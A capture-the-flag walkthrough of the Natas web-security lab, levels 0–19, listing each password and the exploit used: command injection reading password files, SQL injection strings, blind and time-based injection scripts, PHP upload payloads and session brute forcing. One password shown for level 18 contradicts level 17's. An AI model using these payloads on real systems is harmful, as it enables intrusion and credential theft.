# Level 0

Password was commented in the HTML source: `0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`

# Level 1

Enable right-click and check the source - password is commented: `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`

# Level 2

Look at the code, you'll see a directory for files. Navigate to `url/files` and check `users.txt` - there's the pass: `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`

# Level 3

The comment "Google won't find it" is a hint to check `robots.txt`. When we look there, it says don't look at `/s3cr3t`, so we go there and find `users.txt` - boom: `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`

# Level 4

Use intercept or request repeater to send a request with the referer header pointing to the wanted URL: `0n35PkggAPm2zbEpOU802c0x0Msn1ToK`

# Level 5

When we check the cookies, we see something like `loggedin=0`. Change it to `loggedin=1` via intercept or repeater, and it shows us the password: `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`

# Level 6

On the page there's a link to the full source. We can see the code finds the secret from `includes/secret.inc`. Visit that URL to get the secret, then submit it to get the password: `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`

# Level 7

Check the source - there's a hint that the file is in `/etc/natas_webpass/natas8`. Put this in the page parameter: `page=/etc/natas_webpass/natas8` and we get the pass: `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`

# Level 8

Looking at the source, we see a function that takes our input, runs it through transformations, then compares it to an encoded value. To solve it, we need to reverse the encoding:

```php
function decodeSecret($encodedSecret) {
    // Convert hex to binary
    $reversedBase64 = hex2bin($encodedSecret);
    
    // Reverse the string to get proper Base64
    $base64 = strrev($reversedBase64);
    
    // Base64 decode to get original input
    return base64_decode($base64);
}

// Example usage
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
echo decodeSecret($encodedSecret);  // Outputs: oubWYf2kBq
```

Use the output as input and we get the password: `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`

# Level 9

Checking the source, we find the code sends our input into an unsafe terminal command. We can exploit this with:

```bash
pass; cat /etc/natas_webpass/natas10
```

This way we get the pass: `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

# Level 10

Like level 9, but it filters some characters. We can bypass this using:

```bash
.* /etc/natas_webpass/natas11
```

or

```bash
.* /etc/natas_webpass/natas11 #
```

The full command gets treated like this:

```bash
grep -i ".*" /etc/natas_webpass/natas11 dictionary.txt
```

We're basically saying "find everything using `.*`" then providing the files. The `#` comments out `dictionary.txt`.

Password: `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`

# Level 11

For this level we need to decode the XOR to find the key:

```python
import base64
import urllib.parse

cookie_value = "data cookie value"
cookie_value = urllib.parse.unquote(cookie_value)
known_plaintext = b'{"showpassword":"no","bgcolor":"#ffffff"}'
base64_decoded_cookie = base64.b64decode(cookie_value)
key = bytes([base64_decoded_cookie[i] ^ known_plaintext[i] for i in range(len(known_plaintext))])

def find_shortest_repeat(s):
    for i in range(1, len(s) + 1):
        pattern = s[:i]
        if (pattern * (len(s) // i + 1))[:len(s)] == s:
            return pattern
    return s

xor_key = find_shortest_repeat(key)
target_text = b'{"showpassword":"yes","bgcolor":"#ffffff"}'
xor_target_text = bytes([target_text[i] ^ xor_key[i % len(xor_key)] for i in range(len(target_text))])
base64_xor_target_text = base64.b64encode(xor_target_text)
final_target_cookie = urllib.parse.quote(base64_xor_target_text.decode())
print(final_target_cookie)
```

Save the cookie and refresh - you got the pass: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`

# Level 12

For this level we have two choices: use an interceptor or upload using curl. We need to upload a PHP file - basically we exploit the upload function. Create a PHP file like this:

```php
<?php
    $p = file_get_contents("/etc/natas_webpass/natas13");
    echo $p;
?>
```

Send it using curl:

```bash
curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
```

Visit the location returned by this command to get the password: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

# Level 13

For this level we need to trick the function that checks if the file is an image by adding image headers at the top:

```bash
❯ touch natas13.php
❯ echo -e "\xFF\xD8\xFF\xE0" > natas13.php
❯ echo -n '<?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>' >> natas13.php
❯ curl -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./natas13.php" http://natas13.natas.labs.overthewire.org
```

Visit the uploaded file to get the password: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`

# Level 14

Simple SQL injection. Use this in username or password field:

```sql
m" or 1=1#
```

Password: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`

# Level 15

This is a blind SQL injection. We can use this Python code:

```python
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

u = "http://natas15.natas.labs.overthewire.org/index.php?debug"

password = ""  # start with blank password
count = 1      # substr() length argument starts at 1
PASSWORD_LENGTH = 32  # previous passwords were 32 chars long
VALID_CHARS = string.digits + string.ascii_letters

while count <= PASSWORD_LENGTH + 1:
    for c in VALID_CHARS:
        payload = "username=natas16" + \
                  "\" AND " + \
                  "BINARY substring(password,1," + str(count) + ")" + \
                  " = '" + password + c + "'" + \
                  " -- "

        response = requests.post(u, data=payload, headers=headers, auth=basicAuth, verify=False)

        if 'This user exists.' in response.text:
            print("Found one more char : %s" % (password+c))
            password += c
            count = count + 1

print("Done!")
```

Password: `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`

# Level 16

This level is fun! The backend filters some chars, so we need to break it using a blind method with an inner grep. We mainly use two chars: `$` and `()`.

The code is:

```php
passthru("grep -i \"$key\" dictionary.txt");
```

If we give an input like `hacker`, it searches the dictionary for the word. We can exploit this with an inner shell like `$(grep...)`. If we follow it with a word we know is in the dict, we can test: if the inner shell returns true, it won't return anything; if it's false and returns nothing, the rest goes through and we see the word "hacker".

For the inside command, we use a blind method:

```bash
$(grep -E ^chars.* /etc/natas_webpass/natas17)hackers
```

The `^` tells it to look for chars at the start of lines in natas17. If the char is there, we won't see "hackers" in the response.

Python code:

```python
import requests
import string

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

characters = ''.join([string.ascii_letters, string.digits])

password = []
for i in range(1, 34):
    for char in characters:
        uri = "{0}?needle=$(grep -E ^{1}{2}.* /etc/natas_webpass/natas17)hackers".format(url, ''.join(password), char)
        r = requests.get(uri, auth=(auth_username, auth_password))
        if 'hackers' not in r.text:
            password.append(char)
            print(''.join(password))
            break
        else:
            continue
```

We use `^` to make sure we find the right order of characters. Run it and we get the password: `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`

# # Level 17

Looking at the source code, we see the output is commented out, so we need another approach for blind SQL injection. For this level we use **time-based SQL injection** - we track the response time to find the password. You can use similar code to find the username, but based on past levels we can guess it's `natas18`.

This level's code is very similar to level 15, but the difference is the SQL injection input has a condition: if the condition is true (the char is in the password), the `sleep()` method gets called and it takes n seconds to return the response.

The code :

```python
import requests
import string
from requests.auth import HTTPBasicAuth
from concurrent.futures import ThreadPoolExecutor, as_completed

basicAuth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

u = "http://natas17.natas.labs.overthewire.org/index.php?debug"

password = ""
PASSWORD_LENGTH = 32
VALID_CHARS = string.digits + string.ascii_letters

# Use session for connection pooling
session = requests.Session()
session.auth = basicAuth
session.headers.update(headers)
session.verify = False

def test_char(c, current_password, position):
    """Test a single character at current position"""
    payload = (f"username=natas18\" AND "
               f"IF(BINARY substring(password,1,{position}) = '{current_password}{c}', sleep(2), False) -- ")
    
    try:
        response = session.post(u, data=payload, timeout=3)
        if response.elapsed.total_seconds() > 1.8:  # Slightly lower threshold for reliability
            return c
    except requests.exceptions.Timeout:
        # Timeout also indicates sleep was triggered
        return c
    except Exception:
        pass
    return None

print("Starting password crack...")
count = 1

while count <= PASSWORD_LENGTH:
    found_char = None
    
    # Test characters in parallel for THIS position only
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Submit all character tests for current position
        future_to_char = {
            executor.submit(test_char, c, password, count): c 
            for c in VALID_CHARS
        }
        
        # Process results as they complete
        for future in as_completed(future_to_char):
            result = future.result()
            if result:
                found_char = result
                # Cancel remaining futures since we found the right char
                for f in future_to_char:
                    f.cancel()
                break
    
    if found_char:
        password += found_char
        print(f"Found char {count}/{PASSWORD_LENGTH}: {password}")
        count += 1
    else:
        print(f"No character found at position {count}, password might be complete")
        break

print(f"\nDone! Password: {password}")
session.close()
```

Password: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`

# Level 18

In this level, when we read the code it works like this: load all the session content from a `PHPSESSID`, then check the loaded session to see if it has the admin flag inside it. If it does, it considers you as admin and shows you the password.

The key insight is that session IDs are just numbers, and we can brute force them. The code limits session IDs to a maximum of 640, so we can try all of them until we find one that belongs to an admin.

We can find the admin `PHPSESSID` using this code:
```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
BASE_URL = "http://natas18.natas.labs.overthewire.org/index.php?debug"
MAX = 640

for sid in range(1, MAX + 1):
    print(f"Testing PHPSESSID={sid}")
    cookies = {'PHPSESSID': str(sid)}
    resp = requests.get(BASE_URL, auth=auth, cookies=cookies, verify=False)
    
    if "You are an admin" in resp.text or "Username: natas19" in resp.text:
        print(f"\n>>> Found admin session: {sid}\n")
        print(resp.text[:2000])
        break
else:
    print("Admin session not found in range.")
```

With this code we can find the admin `PHPSESSID`. Once we find it (in this case it's `119`), we can see the response and it shows us the password.

Password: `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`

# Level 19

In this level we get a message saying the session ID is no longer sequential. But when we check the `PHPSESSID` cookie, we see some sort of hex-encoded data. When we decode that hex, we get something like this:

```
201-admin
```

So the format is `{number}-{username}` encoded as hex. We can try changing the number to find an admin session ID. For this we use this code:

```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
BASE_URL = "http://natas19.natas.labs.overthewire.org/"
MAX = 1000

for x in range(1, MAX + 1):
    tmp = f"{x}-admin"
    sid = tmp.encode("ascii").hex()
    print(f"Testing PHPSESSID={sid} ({tmp})")
    cookies = {'PHPSESSID': str(sid)}
    resp = requests.get(BASE_URL, auth=auth, cookies=cookies, verify=False)
    
    if "You are an admin" in resp.text:
        print(f"\n>>> Found admin session: {sid} ({tmp})\n")
        print(resp.text[:2000])
        break
else:
    print("Admin session not found in range.")
```

When we run it, we find the password for the next level.

Password: `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`